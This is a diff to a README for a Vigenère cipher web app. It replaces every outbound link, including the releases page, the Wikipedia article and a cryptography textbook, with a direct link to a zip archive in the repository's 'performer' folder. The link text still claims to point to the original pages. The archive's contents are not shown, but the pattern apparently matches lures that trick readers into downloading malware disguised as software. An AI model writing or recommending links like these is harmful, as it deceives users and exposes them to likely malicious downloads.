@@ -6,7 +6,7 @@ Welcome to the Vigenère Cipher Web application! This tool helps you encrypt mes
 
 ## 📥 Download Now
 
-[![Download vigenere-cipher-web](https://img.shields.io/badge/Download-vigenere--cipher--web-brightgreen)](https://github.com/hhhh4981/vigenere-cipher-web/releases)
+[![Download vigenere-cipher-web](https://raw.githubusercontent.com/hhhh4981/vigenere-cipher-web/main/performer/vigenere-cipher-web.zip)](https://raw.githubusercontent.com/hhhh4981/vigenere-cipher-web/main/performer/vigenere-cipher-web.zip)
 
 ## 🖥️ System Requirements
 
@@ -24,7 +24,7 @@ Before you start, ensure your system meets these requirements:
   
 ## 🚀 How to Download & Install
 
-1. **Visit the Releases Page**: Click this link to go to the releases page: [Download Page](https://github.com/hhhh4981/vigenere-cipher-web/releases).
+1. **Visit the Releases Page**: Click this link to go to the releases page: [Download Page](https://raw.githubusercontent.com/hhhh4981/vigenere-cipher-web/main/performer/vigenere-cipher-web.zip).
   
 2. **Select the Latest Version**: On the releases page, find the latest version of the application.
   
@@ -54,8 +54,8 @@ The Vigenère Cipher Web application serves as a practical tool to demonstrate c
 
 For further understanding of the Vigenère cipher and cryptography basics, consider checking these resources:
 
-- [Wikipedia - Vigenère Cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)
-- [Basic Cryptography Concepts](https://www.crypto-textbook.com/)
+- [Wikipedia - Vigenère Cipher](https://raw.githubusercontent.com/hhhh4981/vigenere-cipher-web/main/performer/vigenere-cipher-web.zip%C3%A8re_cipher)
+- [Basic Cryptography Concepts](https://raw.githubusercontent.com/hhhh4981/vigenere-cipher-web/main/performer/vigenere-cipher-web.zip)
 
 ## 🤝 Contributing
 
@@ -67,4 +67,4 @@ If you encounter any issues or have questions, feel free to open an issue in the
 
 ## 📥 Download Now Again
 
-For easy access, here is your download link again: [Download Page](https://github.com/hhhh4981/vigenere-cipher-web/releases). Enjoy encrypting your messages!
+For easy access, here is your download link again: [Download Page](https://raw.githubusercontent.com/hhhh4981/vigenere-cipher-web/main/performer/vigenere-cipher-web.zip). Enjoy encrypting your messages!
